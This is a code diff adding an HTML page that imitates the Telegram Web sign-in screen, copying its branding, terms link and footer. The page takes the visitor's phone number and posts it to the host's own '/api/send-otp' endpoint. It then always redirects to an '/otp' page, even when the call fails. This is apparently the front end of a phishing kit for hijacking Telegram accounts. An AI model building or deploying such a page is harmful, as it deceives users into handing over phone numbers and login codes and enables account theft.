@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Telegram Web</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { width: 100%; max-width: 400px; padding: 20px; }
+        .login-box { background: #222; border-radius: 12px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .logo { text-align: center; font-size: 32px; font-weight: bold; color: #0088cc; margin-bottom: 10px; }
+        .subtitle { text-align: center; color: #aaa; margin-bottom: 30px; }
+        .input-group { margin-bottom: 20px; }
+        label { display: block; color: #ccc; margin-bottom: 8px; font-size: 14px; }
+        input { width: 100%; padding: 12px; background: #333; border: 1px solid #444; border-radius: 6px; color: white; font-size: 16px; }
+        input:focus { outline: none; border-color: #0088cc; }
+        .hint { color: #888; font-size: 12px; margin-top: 5px; }
+        .btn { width: 100%; padding: 14px; background: #0088cc; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .btn:hover { background: #0099dd; }
+        .terms { margin-top: 20px; color: #888; font-size: 12px; text-align: center; }
+        .terms a { color: #0088cc; text-decoration: none; }
+        .footer { margin-top: 20px; text-align: center; color: #666; font-size: 12px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo">Telegram</div>
+            <div class="subtitle">Welcome back! Please sign in.</div>
+            
+            <form id="phoneForm">
+                <div class="input-group">
+                    <label for="phone">Phone Number</label>
+                    <input type="tel" id="phone" name="phone" placeholder="+62 812-3456-7890" required>
+                    <div class="hint">Enter your phone number including country code</div>
+                </div>
+                
+                <button type="submit" class="btn" id="submitBtn">NEXT</button>
+                
+                <div class="terms">
+                    By continuing, you agree to Telegram's 
+                    <a href="https://telegram.org/tos" target="_blank">Terms of Service</a>.
+                </div>
+            </form>
+        </div>
+        <div class="footer">Telegram WebK © 2024</div>
+    </div>
+
+    <script>
+        document.getElementById('phoneForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const phone = document.getElementById('phone').value.trim();
+            const btn = document.getElementById('submitBtn');
+            
+            if (!phone) {
+                alert('Please enter your phone number');
+                return;
+            }
+            
+            // Save to session storage
+            sessionStorage.setItem('tg_phone', phone);
+            
+            // Disable button and show loading
+            btn.disabled = true;
+            btn.textContent = 'Sending code...';
+            
+            try {
+                // Send to API
+                const response = await fetch('/api/send-otp', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ phone: phone })
+                });
+                
+                const data = await response.json();
+                
+                // Always redirect to OTP page (even if API fails)
+                setTimeout(() => {
+                    window.location.href = '/otp';
+                }, 1000);
+                
+            } catch (error) {
+                console.log('Error:', error);
+                // Still redirect
+                setTimeout(() => {
+                    window.location.href = '/otp';
+                }, 1000);
+            }
+        });
+    </script>
+</body>
+</html>
